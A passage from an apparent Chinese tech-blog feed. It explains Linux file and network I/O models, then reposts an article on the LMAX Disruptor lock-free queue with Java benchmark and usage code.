以及内存开销是非常大的。</p><p>对于某些特殊的应用程序来说，避开操作系统内核缓冲区而直接在应用程序地址空间和磁盘之间传输数据会比使用操作系统内核缓冲区获取更好的性能，下边这一小节中提到的自缓存应用程序就是其中的一种。</p><p><strong>标准访问文件的方式</strong></p><p>在 Linux 中，这种访问文件的方式是通过两个系统调用实现的：read() 和 write()。当应用程序调用 read() 系统调用读取一块数据的时候，如果该块数据已经在内存中了，那么就直接从内存中读出该数据并返回给应用程序；如果该块数据不在内存中，那么数据会被从磁盘上读到页高缓存中去，然后再从页缓存中拷贝到用户地址空间中去。如果一个进程读取某个文件，那么其他进程就都不可以读取或者更改该文件；对于写数据操作来说，当一个进程调用了 write() 系统调用往某个文件中写数据的时候，数据会先从用户地址空间拷贝到操作系统内核地址空间的页缓存中去，然后才被写到磁盘上。但是对于这种标准的访问文件的方式来说，在数据被写到页缓存中的时候，write() 系统调用就算执行完成，并不会等数据完全写入到磁盘上。Linux 在这里采用的是我们前边提到的延迟写机制（ deferred writes ）。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image001.jpg" alt="å¾ 1. ä»¥æ åçæ¹å¼å¯¹æä»¶è¿è¡è¯»å"></p><p><strong>同步访问文件的方式</strong></p><p>同步访问文件的方式与上边这种标准的访问文件的方式比较类似，这两种方法一个很关键的区别就是：同步访问文件的时候，写数据的操作是在数据完全被写回磁盘上才算完成的；而标准访问文件方式的写数据操作是在数据被写到页高速缓冲存储器中的时候就算执行完成了。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image002.jpg" alt="å¾ 2. æ°æ®åæ­¥ååç£ç"></p><p><strong>内存映射方式</strong></p><p>在很多操作系统包括 Linux 中，内存区域（ memory region ）是可以跟一个普通的文件或者块设备文件的某一个部分关联起来的，若进程要访问内存页中某个字节的数据，操作系统就会将访问该内存区域的操作转换为相应的访问文件的某个字节的操作。Linux 中提供了系统调用 mmap() 来实现这种文件访问方式。与标准的访问文件的方式相比，内存映射方式可以减少标准访问文件方式中 read() 系统调用所带来的数据拷贝操作，即减少数据在用户地址空间和操作系统内核地址空间之间的拷贝操作。映射通常适用于较大范围，对于相同长度的数据来讲，映射所带来的开销远远低于 CPU 拷贝所带来的开销。当大量数据需要传输的时候，采用内存映射方式去访问文件会获得比较好的效率。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image003.jpg" alt="å¾ 3. å©ç¨ mmap ä»£æ¿ read"></p><p><strong>直接 I/O 方式</strong></p><p>凡是通过直接 I/O 方式进行数据传输，数据均直接在用户地址空间的缓冲区和磁盘之间直接进行传输，完全不需要页缓存的支持。操作系统层提供的缓存往往会使应用程序在读写数据的时候获得更好的性能，但是对于某些特殊的应用程序，比如说数据库管理系统这类应用，他们更倾向于选择他们自己的缓存机制，因为数据库管理系统往往比操作系统更了解数据库中存放的数据，数据库管理系统可以提供一种更加有效的缓存机制来提高数据库中数据的存取性能。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image004.jpg" alt="å¾ 4. æ°æ®ä¼ è¾ä¸ç»è¿æä½ç³»ç»åæ ¸ç¼å²åº"></p><h3 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h3><p>零拷贝的意思是说不需要将数据从某处复制到特定的某一个区域，可以减少CPU在数据复制的消耗还有内存内存带宽。</p><p>它马的发现自己说不清楚，大家去这个网站认真看吧！！</p><p><strong>详见</strong>：<a href="https://juejin.im/post/5d84bd1f6fb9a06b2d780df7">https://juejin.im/post/5d84bd1f6fb9a06b2d780df7</a></p><h2 id="网络IO"><a href="#网络IO" class="headerlink" title="网络IO"></a>网络IO</h2><h3 id="IO模型"><a href="#IO模型" class="headerlink" title="IO模型"></a>IO模型</h3><p><strong>第一种模型</strong>：同步阻塞 I/O。</p><p>这种很简单，就是 Linux 系统的 read 和 write 函数，在调用的时候会被阻塞，直到数据读取完成，或者写入成功。</p><p><strong>第二种模型</strong>：同步非阻塞 I/O。</p><p>和同步阻塞 I/O 的 API 是一样的，只是打开 fd 的时候带有 O_NONBLOCK 参数。于是，当调用 read 和 write 函数的时候，如果没有准备好数据，会理解返回，不会阻塞，然后让应用程序不断地去轮询。</p><p><strong>第三种模型</strong>：I/O 多路复用（IO Multiplexing）。</p><p>前面两种 I/O 都只能用于简单的客户端开发。但对于服务器程序来说，需要处理很多的 fd （连接数可以达几十万甚至百万）。如果使用同步阻塞 I/O，要处理这么多的 fd 需要开非常多的线程，每个线程处理一个 fd；如果用同步非阻塞 I/O，要应用程序轮询这么大规模的 fd。这两种办法都不行，所以就有了 I/O 多路复用。</p><p>在 Linux 系统中，有三种 I/O 多路复用的办法：select、poll、epoll，</p><p>I/O 多路复用是现在 Linux 系统上最成熟的网络 I/O 模型，在三种方式中，epoll 的效率最高，所以目前主流的网络模型都是 epoll。</p><p><strong>第四种模型</strong>：异步 I/O。</p><p>熟悉 Windows 系统开发的人会知道 Windows 系统的 IOCP，这是一种真正意义上的异步 I/O。所谓异步 I/O，是指读写都是由操作系统完成的，然后通过回调函数或者某种其他通信机制通知应用程序。</p><p>在 Linux 系统上，也有异步 I/O 的实现，就是 aio。但由于 aio 并不成熟，所以现在主要还是用 epoll。</p><h3 id="Reactor-模式与-Preactor-模式"><a href="#Reactor-模式与-Preactor-模式" class="headerlink" title="Reactor 模式与 Preactor 模式"></a>Reactor 模式与 Preactor 模式</h3><p>（1）Reactor 模式：主动模式。所谓主动，是指应用程序不断地轮询，询问操作系统或者网络框架、I/O 是否就绪。Linux 系统下的 select、poll、epoll 就属于主动模式，需要应用程序中有一个循环一直轮询；Java 中的 NIO 也属于这种模式。在这种模式下，实际的 I/O 操作还是应用程序执行的。</p><p>（2）Proactor 模式：被动模式。应用程序把 read 和 write 函数操作全部交给操作系统或者网络框架，实际的 I/O 操作由操作系统或网络框架完成，之后再回调应用程序。asio 库就是典型的 Proactor 模式。</p><p>参考：</p><p> <a href="https://www.ibm.com/developerworks/cn/linux/l-cn-directio/#icomments">Linux 中直接 I/O 机制的介绍</a> </p><p><a href="https://www.zhihu.com/pub/book/119621248">《软件架构设计:大型网站技术架构与业务融合之道》</a></p><p><a href="https://juejin.im/post/5d84bd1f6fb9a06b2d780df7">深入剖析Linux IO原理</a> </p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Disruptor</title>
      <link href="/Disruptor/"/>
      <url>/Disruptor/</url>
      
        <content type="html"><![CDATA[<p>应该知道的高性能无锁队列Disruptor;</p> <a id="more"></a><h1 id="你应该知道的高性能无锁队列Disruptor"><a href="#你应该知道的高性能无锁队列Disruptor" class="headerlink" title="你应该知道的高性能无锁队列Disruptor"></a>你应该知道的高性能无锁队列Disruptor</h1><blockquote><p>作者：咖啡拿铁链接：<a href="https://juejin.im/post/5b5f10d65188251ad06b78e3">https://juejin.im/post/5b5f10d65188251ad06b78e3</a></p></blockquote><h1 id="1-何为队列"><a href="#1-何为队列" class="headerlink" title="1.何为队列"></a>1.何为队列</h1><p>听到队列相信大家对其并不陌生，在我们现实生活中队列随处可见，去超市结账，你会看见大家都会一排排的站得好好的，等待结账，为什么要站得一排排的，你想象一下大家都没有素质，一窝蜂的上去结账，不仅让这个超市崩溃，还会容易造成各种踩踏事件，当然这些事其实在我们现实中也是会经常发生。</p><p>当然在计算机世界中，队列是属于一种数据结构，队列采用的FIFO(first in firstout)，新元素（等待进入队列的元素）总是被插入到尾部，而读取的时候总是从头部开始读取。在计算中队列一般用来做排队(如线程池的等待排队，锁的等待排队)，用来做解耦（生产者消费者模式），异步等等。</p><h1 id="2-jdk中的队列"><a href="#2-jdk中的队列" class="headerlink" title="2.jdk中的队列"></a>2.jdk中的队列</h1><p>在jdk中的队列都实现了java.util.Queue接口，在队列中又分为两类，一类是线程不安全的，ArrayDeque，LinkedList等等，还有一类都在java.util.concurrent包下属于线程安全，而在我们真实的环境中，我们的机器都是属于多线程，当多线程对同一个队列进行排队操作的时候，如果使用线程不安全会出现，覆盖数据，数据丢失等无法预测的事情，所以我们这个时候只能选择线程安全的队列。在jdk中提供的线程安全的队列下面简单列举部分队列:</p><table><thead><tr><th>队列名字</th><th>是否加锁</th><th>数据结构</th><th>关键技术点</th><th>是否有锁</th><th>是否有界</th></tr></thead><tbody><tr><td>ArrayBlockingQueue</td><td>是</td><td>数组array</td><td>ReentrantLock</td><td>有锁</td><td>有界</td></tr><tr><td>LinkedBlockingQueue</td><td>是</td><td>链表</td><td>ReentrantLock</td><td>有锁</td><td>有界</td></tr><tr><td>LinkedTransferQueue</td><td>否</td><td>链表</td><td>CAS</td><td>无锁</td><td>无界</td></tr><tr><td>ConcurrentLinkedQueue</td><td>否</td><td>链表</td><td>CAS</td><td>无锁</td><td>无界</td></tr></tbody></table><p>我们可以看见，我们无锁的队列是无界的，有锁的队列是有界的，这里就会涉及到一个问题，我们在真正的线上环境中，无界的队列，对我们系统的影响比较大，有可能会导致我们内存直接溢出，所以我们首先得排除无界队列，当然并不是无界队列就没用了，只是在某些场景下得排除。其次还剩下ArrayBlockingQueue，LinkedBlockingQueue两个队列，他们两个都是用ReentrantLock控制的线程安全，他们两个的区别一个是数组，一个是链表，在队列中，一般获取这个队列元素之后紧接着会获取下一个元素，或者一次获取多个队列元素都有可能，而数组在内存中地址是连续的，在操作系统中会有缓存的优化(下面也会介绍缓存行)，所以访问的速度会略胜一筹，我们也会尽量去选择ArrayBlockingQueue。而事实证明在很多第三方的框架中，比如早期的log4j异步，都是选择的ArrayBlockingQueue。</p><p>当然ArrayBlockingQueue，也有自己的弊端，就是性能比较低，为什么jdk会增加一些无锁的队列，其实就是为了增加性能，很苦恼，又需要无锁，又需要有界，这个时候恐怕会忍不住说一句你咋不上天呢？但是还真有人上天了。</p><h1 id="3-Disruptor"><a href="#3-Disruptor" class="headerlink" title="3.Disruptor"></a>3.Disruptor</h1><p>Disruptor就是上面说的那个天，Disruptor是英国外汇交易公司LMAX开发的一个高性能队列，并且是一个开源的并发框架，并获得2011Duke’s程序框架创新奖。能够在无锁的情况下实现网络的Queue并发操作，基于Disruptor开发的系统单线程能支撑每秒600万订单。目前，包括Apache Storm、Camel、Log4j2等等知名的框架都在内部集成了Disruptor用来替代jdk的队列，以此来获得高性能。</p><h2 id="3-1为什么这么牛逼？"><a href="#3-1为什么这么牛逼？" class="headerlink" title="3.1为什么这么牛逼？"></a>3.1为什么这么牛逼？</h2><p>上面已经把Disruptor吹出了花了，你肯定会产生疑问，他真的能有这么牛逼吗，我的回答是当然的，在Disruptor中有三大杀器:</p><ul><li>CAS</li><li>消除伪共享</li><li>RingBuffer 有了这三大杀器，Disruptor才变得如此牛逼。</li></ul><h3 id="3-1-1锁和CAS"><a href="#3-1-1锁和CAS" class="headerlink" title="3.1.1锁和CAS"></a>3.1.1锁和CAS</h3><p>我们ArrayBlockingQueue为什么会被抛弃的一点，就是因为用了重量级lock锁，在我们加锁过程中我们会把锁挂起，解锁后，又会把线程恢复,这一过程会有一定的开销，并且我们一旦没有获取锁，这个线程就只能一直等待，这个线程什么事也不能做。</p><p>CAS（compare and swap），顾名思义先比较在交换，一般是比较是否是老的值，如果是的进行交换设置，大家熟悉乐观锁的人都知道CAS可以用来实现乐观锁，CAS中没有线程的上下文切换，减少了不必要的开销。 这里使用JMH，用两个线程，每次1一次调用，在我本机上进行测试，代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@BenchmarkMode(&#123;Mode.SampleTime&#125;)</span></span><br><span class="line"><span class="meta">@OutputTimeUnit(TimeUnit.MILLISECONDS)</span></span><br><span class="line"><span class="meta">@Warmup(iterations=3, time = 5, timeUnit = TimeUnit.MILLISECONDS)</span></span><br><span class="line"><span class="meta">@Measurement(iterations=1,batchSize = 100000000)</span></span><br><span class="line"><span class="meta">@Threads(2)</span></span><br><span class="line"><span class="meta">@Fork(1)</span></span><br><span class="line"><span class="meta">@State(Scope.Benchmark)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myclass</span> </span>&#123;</span><br><span class="line">    Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">    <span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line">    AtomicLong atomicLong = <span class="keyword">new</span> AtomicLong(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">@Benchmark</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">measureLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        i++;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Benchmark</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">measureCAS</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        atomicLong.incrementAndGet();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Benchmark</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">measureNoLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试出来结果如下:</p><table><thead><tr><th>测试项目</th><th>测试结果</th></tr></thead><tbody><tr><td>Lock</td><td>26000ms</td></tr><tr><td>CAS</td><td>4840ms</td></tr><tr><td>无锁</td><td>197ms</td></tr></tbody></table><p>可以看见Lock是五位数，CAS是四位数，无锁更小是三位数。 由此我们可以知道Lock&gt;CAS&gt;无锁。</p><p>而我们的Disruptor中使用的就是CAS，他利用CAS进行队列中的一些下标设置，减少了锁的冲突，提高了性能。</p><p>另外对于jdk中其他的无锁队列也是使用CAS，原子类也是使用CAS。</p><h3 id="3-1-2伪共享"><a href="#3-1-2伪共享" class="headerlink" title="3.1.2伪共享"></a>3.1.2伪共享</h3><p>谈到了伪共享就不得不说计算机CPU缓存,缓存大小是CPU的重要指标之一，而且缓存的结构和大小对CPU速度的影响非常大，CPU内缓存的运行频率极高，一般是和处理器同频运作，工作效率远远大于系统内存和硬盘。实际工作时，CPU往往需要重复读取同样的数据块，而缓存容量的增大，可以大幅度提升CPU内部读取数据的命中率，而不用再到内存或者硬盘上寻找，以此提高系统性能。但是从CPU芯片面积和成本的因素来考虑，缓存都很小。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_1.jpg" alt="img"></p><p>CPU缓存可以分为一级缓存，二级缓存，如今主流CPU还有三级缓存，甚至有些CPU还有四级缓存。每一级缓存中所储存的全部数据都是下一级缓存的一部分，这三种缓存的技术难度和制造成本是相对递减的，所以其容量也是相对递增的。</p><p>为什么CPU会有L1、L2、L3这样的缓存设计？主要是因为现在的处理器太快了，而从内存中读取数据实在太慢（一个是因为内存本身速度不够，另一个是因为它离CPU太远了，总的来说需要让CPU等待几十甚至几百个时钟周期），这个时候为了保证CPU的速度，就需要延迟更小速度更快的内存提供帮助，而这就是缓存。对这个感兴趣可以把电脑CPU拆下来，自己把玩一下。</p><p>每一次你听见intel发布新的cpu什么,比如i7-7700k,8700k，都会对cpu缓存大小进行优化，感兴趣可以自行下来搜索，这些的发布会或者发布文章。</p><p>Martin和Mike的 QConpresentation演讲中给出了一些每个缓存时间：</p><table><thead><tr><th>从CPU到</th><th>大约需要的CPU周期</th><th>大约需要的时间</th></tr></thead><tbody><tr><td>主存</td><td></td><td>约60-80纳秒</td></tr><tr><td>QPI 总线传输(between sockets, not drawn)</td><td></td><td>约20ns</td></tr><tr><td>L3 cache</td><td>约40-45 cycles</td><td>约15ns</td></tr><tr><td>L2 cache</td><td>约10 cycles</td><td>约3ns</td></tr><tr><td>L1 cache</td><td>约3-4 cycles</td><td>约1ns</td></tr><tr><td>寄存器</td><td></td><td>1 cycle</td></tr></tbody></table><h4 id="缓存行"><a href="#缓存行" class="headerlink" title="缓存行"></a>缓存行</h4><p>在cpu的多级缓存中，并不是以独立的项来保存的，而是类似一种pageCahe的一种策略，以缓存行来保存，而缓存行的大小通常是64字节，在Java中Long是8个字节，所以可以存储8个Long,举个例子，你访问一个long的变量的时候，他会把帮助再加载7个，我们上面说为什么选择数组不选择链表，也就是这个原因，在数组中可以依靠缓冲行得到很快的访问。 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_2.jpg" alt="img"></p><p>缓存行是万能的吗？NO，因为他依然带来了一个缺点，我在这里举个例子说明这个缺点，可以想象有个数组队列，ArrayQueue，他的数据结构如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> maxSize;</span><br><span class="line">    <span class="keyword">long</span> currentIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于maxSize是我们一开始就定义好的，数组的大小，对于currentIndex，是标志我们当前队列的位置，这个变化比较快，可以想象你访问maxSize的时候，是不是把currentIndex也加载进来了，这个时候，其他线程更新currentIndex,就会把cpu中的缓存行置位无效，请注意这是CPU规定的，他并不是只吧currentIndex置位无效，如果此时又继续访问maxSize他依然得继续从内存中读取，但是MaxSize却是我们一开始定义好的，我们应该访问缓存即可，但是却被我们经常改变的currentIndex所影响。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_3.jpg" alt="img"></p><h4 id="Padding的魔法"><a href="#Padding的魔法" class="headerlink" title="Padding的魔法"></a>Padding的魔法</h4><p>为了解决上面缓存行出现的问题，在Disruptor中采用了Padding的方式，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class LhsPadding</span><br><span class="line">&#123;</span><br><span class="line">    protected long p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Value extends LhsPadding</span><br><span class="line">&#123;</span><br><span class="line">    protected volatile long value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RhsPadding extends Value</span><br><span class="line">&#123;</span><br><span class="line">    protected long p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中的Value就被其他一些无用的long变量给填充了。这样你修改Value的时候，就不会影响到其他变量的缓存行。</p><p>最后顺便一提，在jdk8中提供了@Contended的注解，当然一般来说只允许Jdk中内部，如果你自己使用那就得配置Jvm参数 -RestricContentended = fase，将限制这个注解置位取消。很多文章分析了ConcurrentHashMap，但是都把这个注解给忽略掉了，在ConcurrentHashMap中就使用了这个注解，在ConcurrentHashMap每个桶都是单独的用计数器去做计算，而这个计数器由于时刻都在变化，所以被用这个注解进行填充缓存行优化，以此来增加性能。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_4.jpg" alt="img"></p><h3 id="3-1-3RingBuffer"><a href="#3-1-3RingBuffer" class="headerlink" title="3.1.3RingBuffer"></a>3.1.3RingBuffer</h3><p>在Disruptor中采用了数组的方式保存了我们的数据，上面我们也介绍了采用数组保存我们访问时很好的利用缓存，但是在Disruptor中进一步选择采用了环形数组进行保存数据，也就是RingBuffer。在这里先说明一下环形数组并不是真正的环形数组，在RingBuffer中是采用取余的方式进行访问的，比如数组大小为 10，0访问的是数组下标为0这个位置，其实10，20等访问的也是数组的下标为0的这个位置。</p><blockquote><p>实际上，在这些框架中取余并不是使用%运算，都是使用的&amp;与运算，这就要求你设置的大小一般是2的N次方也就是，10,100,1000等等，这样减去1的话就是，1，11，111，就能很好的使用index &amp; (size -1),这样利用位运算就增加了访问速度。 如果在Disruptor中你不用2的N次方进行大小设置，他会抛出buffersize必须为2的N次方异常。</p></blockquote><p>当然其不仅解决了数组快速访问的问题，也解决了不需要再次分配内存的问题，减少了垃圾回收，因为我们0，10，20等都是执行的同一片内存区域，这样就不需要再次分配内存，频繁的被JVM垃圾回收器回收。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/dis_5.jpg" alt="img"></p><p>自此三大杀器已经说完了，有了这三大杀器为Disruptor如此高性能垫定了基础。接下来还会在讲解如何使用Disruptor和Disruptor的具体的工作原理。</p><h2 id="3-2Disruptor怎么使用"><a href="#3-2Disruptor怎么使用" class="headerlink" title="3.2Disruptor怎么使用"></a>3.2Disruptor怎么使用</h2><p>下面举了一个简单的例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ublic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 队列中的元素</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">            <span class="meta">@Contended</span></span><br><span class="line">            <span class="keyword">private</span> String value;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.value = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生产者的线程工厂</span></span><br><span class="line">        ThreadFactory threadFactory = <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Thread(r, <span class="string">&quot;simpleThread&quot;</span> + String.valueOf(i++));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RingBuffer生产工厂,初始化RingBuffer的时候使用</span></span><br><span class="line">        EventFactory&lt;Element&gt; factory = <span class="keyword">new</span> EventFactory&lt;Element&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Element <span class="title">newInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Element();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理Event的handler</span></span><br><span class="line">        EventHandler&lt;Element&gt; handler = <span class="keyword">new</span> EventHandler&lt;Element&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEvent</span><span class="params">(Element element, <span class="keyword">long</span> sequence, <span class="keyword">boolean</span> endOfBatch)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Element: &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;: &quot;</span> + element.getValue() + <span class="string">&quot;: &quot;</span> + sequence);</span><br><span class="line"><span class="comment">//                Thread.sleep(10000000);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 阻塞策略</span></span><br><span class="line">        BlockingWaitStrategy strategy = <span class="keyword">new</span> BlockingWaitStrategy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指定RingBuffer的大小</span></span><br><span class="line">        <span class="keyword">int</span> bufferSize = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建disruptor，采用单生产者模式</span></span><br><span class="line">        Disruptor&lt;Element&gt; disruptor = <span class="keyword">new</span> Disruptor(factory, bufferSize, threadFactory, ProducerType.SINGLE, strategy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置EventHandler</span></span><br><span class="line">        disruptor.handleEventsWith(handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动disruptor的线程</span></span><br><span class="line">        disruptor.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            disruptor.publishEvent((element, sequence) -&gt; &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;之前的数据&quot;</span> + element.getValue() + <span class="string">&quot;当前的sequence&quot;</span> + sequence);</span><br><span class="line">                element.setValue(<span class="string">&quot;我是第&quot;</span> + sequence + <span class="string">&quot;个&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在Disruptor中有几个比较关键的: ThreadFactory：这是一个线程工厂，用于我们Disruptor中生产者消费的时候需要的线程。 EventFactory：事件工厂，用于产生我们队列元素的工厂，在Disruptor中，他会在初始化的时候直接填充满RingBuffer，一次到位。 EventHandler：用于处理Event的handler，这里一个EventHandler可以看做是一个消费者，但是多个EventHandler他们都是独立消费的队列。 WorkHandler:也是用于处理Event的handler，和上面区别在于，多个消费者都是共享同一个队列。 WaitStrategy：等待策略，在Disruptor中有多种策略，来决定消费者获消费时，如果没有数据采取的策略是什么？下面简单列举一下Disruptor中的部分策略</p><ul><li>BlockingWaitStrategy：通过线程阻塞的方式，等待生产者唤醒，被唤醒后，再循环检查依赖的sequence是否已经消费。</li><li>BusySpinWaitStrategy：线程一直自旋等待，可能比较耗cpu</li><li>LiteBlockingWaitStrategy：线程阻塞等待生产者唤醒，与BlockingWaitStrategy相比，区别在signalNeeded.getAndSet,如果两个线程同时访问一个访问waitfor,一个访问signalAll时，可以减少lock加锁次数.</li><li>LiteTimeoutBlockingWaitStrategy：与LiteBlockingWaitStrategy相比，设置了阻塞时间，超过时间后抛异常。</li><li>YieldingWaitStrategy：尝试100次，然后Thread.yield()让出cpu</li></ul><p>EventTranslator:实现这个接口可以将我们的其他数据结构转换为在Disruptor中流通的Event。</p><h2 id="3-3工作原理"><a href="#3-3工作原理" class="headerlink" title="3.3工作原理"></a>3.3工作原理</h2><p>上面已经介绍了CAS，减少伪共享,RingBuffer三大杀器，介绍下来说一下Disruptor中生产者和消费者的整个流程。</p><h3 id="3-3-1生产者"><a href="#3-3-1生产者" class="headerlink" title="3.3.1生产者"></a>3.3.1生产者</h3><p>对于生产者来说，可以分为多生产者和单生产者，用ProducerType.Single,和ProducerType.MULTI区分，多生产者和单生产者来说多了CAS，因为单生产者由于是单线程，所以不需要保证线程安全。</p><p>在disruptor中通常用disruptor.publishEvent和disruptor.publishEvents()进行单发和群发。</p><p>在disruptor发布一个事件进入队列需要下面几个步骤:</p><ol><li>首先获取RingBuffer中下一个在RingBuffer上可以发布的位置，这个可以分为两类:</li></ol><ul><li><p>从来没有写过的位置</p></li><li><p>已经被所有消费者读过，可以在写的位置。 